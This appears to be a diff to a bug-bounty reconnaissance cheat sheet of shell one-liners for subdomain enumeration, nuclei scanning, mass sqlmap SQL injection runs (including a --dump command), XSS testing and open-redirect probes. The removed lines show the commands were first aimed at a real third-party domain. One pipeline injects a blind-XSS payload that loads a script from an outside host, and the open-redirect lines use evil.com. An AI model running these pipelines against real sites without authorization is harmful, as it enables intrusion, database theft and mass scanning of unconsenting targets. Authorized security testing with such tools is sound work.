@@ -4,7 +4,7 @@
 
 
 ```bash
-subfinder -d viator.com -all  -recursive > subdomain.txt
+subfinder -d target.com -all  -recursive > subdomain.txt
 ```
 
 ```bash
@@ -34,17 +34,17 @@ cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
 
 ```bash
 
-echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+echo target.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
 ```
 
 ```bash
 
-dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+dirsearch  -u https://www.target.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
 ```
 
 ```bash
 
-subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+subfinder -d target.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
 ```
 
 ```bash
@@ -53,17 +53,13 @@ subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 
 ```bash
 
-python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
 ```
+
 
 ```bash
 
-nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
-```
-
-```bash
-
-nuclei  -list ~/vaitor/subdomains_alive.txt -tags cves,osint,tech
+nuclei  -list subdomains_alive.txt -tags cves,osint,tech
 ```
 
 ```bash
@@ -72,7 +68,7 @@ cat allurls.txt | gf lfi | nuclei -tags lfi
 ```
 
 ```bash
-cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+cat allurls.txt | gf redirect | openredirex -p /home/vulncrax/openRedirect
 ```
 <h1>Sqli</h1>
 
@@ -93,4 +89,57 @@ sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T
 ```
 
 
+<h1>SQLi One Linear :</h1>
+
+```bash
+cat target.txt | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+```
+
+```bash
+subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+```
+
+
+<h1>Testing for xss and sqli at the same time :</h1>
+
+```bash
+cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
+```
+
+```bash
+sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+
+```
+
+```bash
+cat param.txt | kxss
+```
+
+<h1>Running Nuclei :-</h1>
+
+```bash
+nuclei -u https://example.com
+```
+
+```bash
+nuclei -list urls.txt -t /fuzzing-templates
+```
+
+```bash
+nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
+```
+
+```bash
+nuclei -u https://example.com -w workflows/
+```
+
+<h1>Open Redirect:-</h1>
+
+```bash
+waybackurls target.com | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+```
+
+```bash
+httpx -l i.txt -path "///evil.com" -status-code -mc 302
+```
 
